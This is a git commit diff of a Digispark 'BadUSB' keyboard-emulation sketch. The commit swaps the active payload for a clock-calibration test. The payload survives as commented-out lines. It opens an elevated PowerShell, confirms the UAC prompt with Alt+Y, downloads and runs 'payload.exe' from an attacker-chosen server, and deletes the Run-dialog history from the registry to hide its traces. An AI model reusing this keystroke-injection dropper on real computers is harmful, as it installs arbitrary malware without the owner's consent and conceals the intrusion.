dc3c0f9cf4994da5b26182fa5e0991d92ac02170
Antonio Vanegas <hpsaturn@gmail.com>
2018-09-03 15:00:01 -0500

    testing time boot functions

--- src/main.cpp
+++ src/main.cpp
@@ -1,5 +1,16 @@
 #include <Arduino.h>
 #include "DigiKeyboard.h"
+#include <avr/boot.h>
+
+byte read_factory_calibration(void) {
+  byte SIGRD = 5; // for some reason this isn't defined...
+  byte value = boot_signature_byte_get(1);
+  return value;
+}
+
+boolean is_clock_calibrated(void) {
+  return read_factory_calibration() != OSCCAL;
+}
 
 int blinkPin = 1;
 void setup()
@@ -11,21 +22,26 @@ void setup()
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(100);
-  DigiKeyboard.println("powershell Start-Process powershell -Verb runAs");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
-  DigiKeyboard.delay(1000);
-  // Modify 127.0.0.1 with your IP address and payload.exe with your payload file name
-  DigiKeyboard.println("$down = New-Object System.Net.WebClient; $url = 'http://127.0.0.1/payload.exe'; $file = 'payload.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.print("echo is_clock_calibrated => ");
   DigiKeyboard.delay(100);
-  // Clear run command history
-  DigiKeyboard.println("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f");
+  char output [10];
+  sprintf(output,"%s",is_clock_calibrated() ? "true":"false");
+  DigiKeyboard.print(output);
   DigiKeyboard.delay(100);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(100);
+  // DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  // DigiKeyboard.delay(1000);
+  // DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
+  // DigiKeyboard.delay(1000);
+  // // Modify 127.0.0.1 with your IP address and payload.exe with your payload file name
+  // DigiKeyboard.println("$down = New-Object System.Net.WebClient; $url = 'http://127.0.0.1/payload.exe'; $file = 'payload.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
+  // DigiKeyboard.delay(1000);
+  // DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  // DigiKeyboard.delay(100);
+  // // Clear run command history
+  // DigiKeyboard.println("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f");
+  // DigiKeyboard.delay(100);
+  // DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  // DigiKeyboard.delay(100);
   digitalWrite(blinkPin, HIGH);
   delay(1000);
 }
